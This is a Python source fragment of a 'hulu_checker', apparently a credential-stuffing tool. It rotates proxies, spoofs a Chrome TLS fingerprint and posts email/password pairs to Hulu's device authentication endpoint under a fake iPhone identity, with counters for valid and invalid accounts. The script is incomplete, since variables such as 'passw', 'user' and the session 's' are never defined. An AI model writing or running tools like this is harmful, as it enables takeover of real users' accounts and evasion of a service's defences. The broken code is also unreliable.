import os, sys, json, time, random, string, ctypes, concurrent.futures
import requests
import colorama
import pystyle
import datetime
import uuid
import functools
import threading

from colorama import Fore, Style
from tls_client import Session
from random import choice
from json import dumps
from pystyle import System, Colors, Colorate, Write
from concurrent import futures
from uuid import uuid4

invalid = 0
valid = 0
proxy_error = 0
custom = 0
accounts_processed = 0

def hulu_checker():
    global invalid, valid, proxy_error, accounts_processed
    proxy = choice(open("proxies.txt", "r").readlines()).strip() if len(open("proxies.txt", "r").readlines()) != 0 else None
    
    session = Session(client_identifier="chrome_114", random_tls_extension_order=True)
    data={
    "affiliate_name":"apple",
    "friendly_name":"mbconfigs+Iphone",
    "password":passw,
    "product_name":"iPhone7%2C2",
    "serial_number":"00001e854946e42b1cbf418fe7d2dcd64df0",
    "user_email":user,  
   }
    head = {
    'content-type':'application/x-www-form-urlencoded',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Pragma':'no-cache',
    'Accept':'*/*',
   }
    
    response = s.post('https://auth.hulu.com/v1/device/password/authenticate',data=data,headers=head,timeout=100).json()

    print(response)
